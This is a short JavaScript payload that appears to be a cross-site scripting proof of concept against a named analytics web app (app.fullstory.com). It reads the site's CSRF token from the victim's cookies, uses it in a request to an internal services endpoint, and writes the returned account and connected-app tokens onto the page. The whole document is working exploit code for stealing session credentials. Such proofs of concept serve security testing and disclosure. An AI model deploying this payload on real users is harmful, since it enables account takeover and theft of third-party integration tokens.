

alert(document.domain);

function getCsrfToken() {
      var cookies = document['cookie'].split(';');
      for (var i = 0; i < cookies.length; i++) {
        var part = cookies[i].trim();
        if (part.indexOf('fs_csrftoken') == 0) {
          return part.substring('fs_csrftoken='.length, part.length);
        }
      }
      return null;
    }



var xhr = new XMLHttpRequest();

xhr.open("GET", "https://app.fullstory.com/souq/services", true);

var csrfToken = getCsrfToken();
if (csrfToken) {
    xhr.setRequestHeader("Csrftoken", csrfToken);
}
alert('your CSRF token: '+csrfToken);
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      document.write('<h1>All your tokens to access your account and all your connected apps token</h1><br>'+xhr.response);
    }
  }

xhr.send();




